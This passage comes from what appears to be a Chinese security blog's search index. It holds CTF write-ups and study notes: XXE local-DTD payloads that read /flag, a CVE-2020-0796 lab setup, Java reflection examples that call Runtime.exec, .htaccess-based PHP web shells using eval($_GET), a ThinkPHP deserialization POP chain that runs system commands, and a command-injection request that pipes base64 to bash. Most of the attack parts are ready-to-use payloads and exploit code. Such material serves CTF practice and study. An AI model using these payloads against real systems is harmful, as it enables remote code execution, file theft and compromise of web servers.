        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]></code></pre>
<p><img src="/2022/02/09/xxe/googlectf-2019-bnv/googlectf-2019-bnv/image-20220209225726846.png" alt="image-20220209225726846"></p>
<pre class=" language-dtd"><code class="language-dtd"><?xml version="1.0"?>
<!DOCTYPE message[
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///flag">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///aaaaa/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
'>
%local_dtd;
]></code></pre>
]]></content>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-0796 Windows10永恒之黑复现</title>
    <url>/2022/02/10/cve-2020-0796-windows10-yong-heng-zhi-hei-fu-xian/cve-2020-0796-windows10-yong-heng-zhi-hei-fu-xian/</url>
    <content><![CDATA[<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><ul>
<li>Windows 10 Version 1903 for 32-bit Systems</li>
<li>Windows 10 Version 1903 for x64-based Systems</li>
<li>Windows 10 Version 1903 for ARM64-based Systems</li>
<li>Windows Server, Version 1903 (Server Core installation)</li>
<li>Windows 10 Version 1909 for 32-bit Systems</li>
<li>Windows 10 Version 1909 for x64-based Systems</li>
<li>Windows 10 Version 1909 for ARM64-based Systems</li>
<li>Windows Server, Version 1909 (Server Core installation)</li>
</ul>
<h2 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01    准备工作"></a>0x01    准备工作</h2><p>靶机： Windows 10（IP：192.168.178.136）</p>
<p>攻击机：Kali 2020（IP：192.168.178.128）</p>
]]></content>
  </entry>
  <entry>
    <title>Java反射学习</title>
    <url>/2022/04/20/java-an-quan/java-fan-she-xue-xi/java-fan-she-xue-xi/</url>
    <content><![CDATA[<p>本文基于『代码审计』知识星球 - 《java安全漫谈》<br>看一段代码</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span>String className<span class="token punctuation">,</span> String methodName<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
 Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
 clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span>methodName<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>这⼏个⽅法包揽了Java安全⾥各种和反射有关的Payload。</p>
<h3 id="反射的概念"><a href="#反射的概念" class="headerlink" title="反射的概念"></a>反射的概念</h3><p>反射是Java的特征之一，是一种间接操作目标对象的机制，核心是JVM在运行状态的时候才动态加载类，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的方法/访问属性。这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p>
<p>java反射机制组成需要重点注意以下的类：</p>
<p>java.lang.Class：类对象;</p>
<p>java.lang.reflect.Constructor：类的构造器对象;</p>
<p>java.lang.reflect.Field：类的属性对象;</p>
<p>java.lang.reflect.Method：类的方法对象;</p>
<h3 id="获取类的方法"><a href="#获取类的方法" class="headerlink" title="获取类的方法"></a>获取类的方法</h3><ol>
<li>class.forName()方法，无需import可以加载任意类，执行static()中的代码</li>
<li>obj.getClass()方法,需上下文存在某个类的实例obj</li>
<li>.class直接获取，获取已经加载的某个类，不属于反射</li>
<li>getSystemClassLoader().loadClass()，N不会执行static()中的代码</li>
</ol>
<p>forName有两个函数重载： </p>
<pre class=" language-java"><code class="language-java">Class <span class="token class-name">forName</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> 
<span class="token comment" spellcheck="true">//等于</span>
Class <span class="token class-name">forName</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token keyword">boolean</span><span class="token operator">*</span><span class="token operator">*</span> initialize<span class="token punctuation">,</span> ClassLoader loader<span class="token punctuation">)</span></code></pre>
<p>在 forName 的时候，构造函数并不会执⾏</p>
<p>看如下这个类</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TrainPrint</span> <span class="token punctuation">{</span>
    <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Empty block initial %s\n"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Static initial %s\n"</span><span class="token punctuation">,</span> TrainPrint<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token function">TrainPrint</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Inital %s\n"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>⾸首先调⽤用的是 static {} ，其次是 {} ，最后是构造函数，static {} 就是在“类初始化”的时候调用的，而 {} 中的代码会放在构造函数的 super() 后面，但在当前构造函数内容的前面</p>
<p>forName 中的 initialize=true 其实就是告诉Java虚拟机是否执⾏”类初始化“</p>
<p>假设有如下函数，name可控</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">ref</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>
 Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>可以编写恶意类，置于static{}中</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Process<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TouchFile</span> <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            Runtime rt <span class="token operator">=</span> Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            String<span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"touch"</span><span class="token punctuation">,</span> <span class="token string">"/tmp/success"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
            Process pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>
            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
             <span class="token comment" spellcheck="true">// do nothing</span>
         <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>Java的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： <code>C1.class</code> 和 <code>C1$C2.class</code> ，我们可以把他们看作两个无关的类，通过 <code>Class.forName("C1$C2")</code> 即可加载这个内部类。</p>
<h3 id="获取成员变量Field"><a href="#获取成员变量Field" class="headerlink" title="获取成员变量Field"></a>获取成员变量Field</h3><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//返回 字段对象，该对象反映此 类对象表示的类或接口的指定声明字段。</span>
<span class="token function">getDeclaredField</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">//返回 字段对象的数组， 字段对象反映由此 类对象表示的类或接口声明的所有字段。</span>
<span class="token function">getDeclaredFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">//返回 字段对象，该对象反映此 类对象表示的类或接口的指定公共成员字段。</span>
<span class="token function">getField</span><span class="token punctuation">(</span>String name<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">//返回一个包含 字段对象的数组， 字段对象反映此 类对象所表示的类或接口的所有可访问公共字段。</span>
<span class="token function">getFields</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>上面两个可以获取的是所有的成员变量，下面的两个得到的只有<code>public</code>的成员变量。第一第三个可以传入一个名字（字符串）来得到指定的成员变量，而第二第四个只能得到一个数组，没法得到指定的。前两个虽然不受到<code>public</code>的限制，但是它不能得到超类的成员变量。后两个虽然只能得到<code>public</code>成员变量，但是可以得到超类的<code>public</code>成员变量。</p>
<h3 id="获取方法method"><a href="#获取方法method" class="headerlink" title="获取方法method"></a>获取方法method</h3><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//返回方法对象，该对象反映此类对象表示的类或接口的指定声明方法。</span>
<span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> 类<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> parameterTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//返回一个包含方法对象的数组，方法对象反映此 类对象表示的类或接口的所有已声明方法，包括public，protected，default（package）访问和私有方法，但不包括继承的方法。</span>
<span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//返回方法对象，该对象反映此类对象表示的类或接口的指定公共成员方法。</span>
<span class="token function">getMethod</span><span class="token punctuation">(</span>String name<span class="token punctuation">,</span> 类<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> parameterTypes<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment" spellcheck="true">//返回一个包含方法对象的数组，方法对象反映此类对象所表示的类或接口的所有公共方法，包括由类或接口声明的那些以及从超类和超接口继承的那些。</span>
<span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h3 id="获取构造函数Constructor"><a href="#获取构造函数Constructor" class="headerlink" title="获取构造函数Constructor"></a>获取构造函数Constructor</h3><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//返回一个 构造器对象，该对象反映此 类对象所表示的类或接口的指定构造函数。</span>
<span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span>类<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> parameterTypes<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">//返回 构造器对象的数组， 构造器对象反映由此 类对象表示的类声明的所有构造函数。</span>
<span class="token function">getDeclaredConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">//返回一个 构造器对象，该对象反映此 类对象所表示的类的指定公共构造函数。</span>
<span class="token function">getConstructor</span><span class="token punctuation">(</span>类<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> parameterTypes<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">//返回一个包含 构造器对象的数组， 构造器对象反映了此 类对象所表示的类的所有公共构造函数。</span>
<span class="token function">getConstructors</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h3 id="实例化类"><a href="#实例化类" class="headerlink" title="实例化类"></a>实例化类</h3><p>newInstance(),调用这个类的无构造参数</p>
<h3 id="执行函数的方法"><a href="#执行函数的方法" class="headerlink" title="执行函数的方法"></a>执行函数的方法</h3><p>invoke</p>
<p>举个例子，来自《java安全漫谈》</p>
<pre class=" language-java"><code class="language-java">Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span>String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>可以分解为</p>
<pre class=" language-java"><code class="language-java">Class <span class="token class-name">clazz</span> <span class="token operator">=</span> Class<span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Method execMethod <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Method getRuntimeMethod <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Object runtime <span class="token operator">=</span> getRuntimeMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>
execMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>runtime<span class="token punctuation">,</span> <span class="token string">"calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？ </p>
<p>如果一个方法或构造方法是私有方法，我们是否能执行它呢？</p>
]]></content>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>XNUCA：2019-EasyPHP采用.htaccess绕过三种解法</title>
    <url>/2022/03/03/xnuca-2019-easyphp-cai-yong-htaccess-rao-guo-san-chong-jie-fa/xnuca-2019-easyphp-cai-yong-htaccess-rao-guo-san-chong-jie-fa/</url>
    <content><![CDATA[<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

htaccess <span class="token operator">=</span> <span class="token triple-quoted-string string">'''php_value auto_prepend_fi\\
le ".htaccess"
%23&lt;?php echo `cat /????`; ?>\\'''</span>

url <span class="token operator">=</span> <span class="token string">'http://7ffb4623-1986-4ef9-8e43-b5a91fe9ffee.node4.buuoj.cn:81/?filename={}&amp;content={}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token string">'.htaccess'</span><span class="token punctuation">,</span> htaccess<span class="token punctuation">)</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span></code></pre>
<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><pre class=" language-php"><code class="language-php">php_value include_path <span class="token string">"/tmp/xx/+ADw?php die(eval($_GET[2]))+ADs +AF8AXw-halt+AF8-compiler()+ADs"</span>
php_value error_reporting <span class="token number">32767</span>
php_value error_log <span class="token operator">/</span>tmp<span class="token operator">/</span>fl3g<span class="token punctuation">.</span>php
<span class="token shell-comment comment"># \</span></code></pre>
<pre class=" language-php"><code class="language-php">php_value include_path <span class="token string">"/tmp"</span>
php_value zend<span class="token punctuation">.</span>multibyte <span class="token number">1</span>
php_value zend<span class="token punctuation">.</span>script_encoding <span class="token string">"UTF-7"</span>
<span class="token shell-comment comment"># \  </span></code></pre>
<h2 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h2><pre class=" language-php"><code class="language-php">php_value pcre<span class="token punctuation">.</span>backtrack_limit    <span class="token number">0</span>
php_value auto_append_file    <span class="token string">".htaccess"</span>
php_value pcre<span class="token punctuation">.</span>jit   <span class="token number">0</span>
<span class="token shell-comment comment">#aa&lt;?php eval($_GET[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>\  </code></pre>
]]></content>
  </entry>
  <entry>
    <title>CISCN2022web</title>
    <url>/2022/06/01/ciscn2022web/ciscn2022web/</url>
    <content><![CDATA[<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p><a href="https://www.freebuf.com/vuls/321546.html">https://www.freebuf.com/vuls/321546.html</a></p>
<p>入口/index.php/Index/test/</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">{</span>
    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token variable">$lazySave</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$jsonAssoc</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">lazySave</span> <span class="token operator">=</span> True<span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'whoami'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">'cat /flag.txt'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">exists</span> <span class="token operator">=</span> True<span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'whoami'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'whoami'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'whoami'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">jsonAssoc</span> <span class="token operator">=</span> True<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">{</span>
    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>
    <span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span><span class="token punctuation">{</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h2 id="online-crt"><a href="#online-crt" class="headerlink" title="online_crt"></a>online_crt</h2><p>查看app.py下三个路由</p>
<p><img src="/2022/06/01/ciscn2022web/ciscn2022web/image-20220601110938302.png" alt="image-20220601110938302"></p>
<p>查看go源代码</p>
<p><img src="/2022/06/01/ciscn2022web/ciscn2022web/image-20220601111006298.png" alt="image-20220601111006298"></p>
<p>将旧的crt改为新的crt</p>
<p>最后echo出来</p>
<p><img src="/2022/06/01/ciscn2022web/ciscn2022web/image-20220601112736207.png" alt="image-20220601112736207"></p>
<pre><code>/admin%2frename?oldname=c2277275-5f88-424c-a29b-5dc09a6ead46.crt&amp;newname=ca'a.crt%22%7
Cecho%20Y2F0IC4uLy4uLy4uL2ZsYWcgICA%2BYmIudHh0%7Cbase64%20-d%7Cbash%22 HTTP/1.1
Host: admin
Cookie: bbb

</code></pre>
<p>访问这个</p>
<p><img src="/2022/06/01/ciscn2022web/ciscn2022web/image-20220601112757565.png" alt="image-20220601112757565"></p>
<p>最后去访问这个由crt带出来的txt</p>
<p><img src="/2022/06/01/ciscn2022web/ciscn2022web/image-20220601112807381.png" alt="image-20220601112807381"></p>
]]></content>
  </entry>
</search>
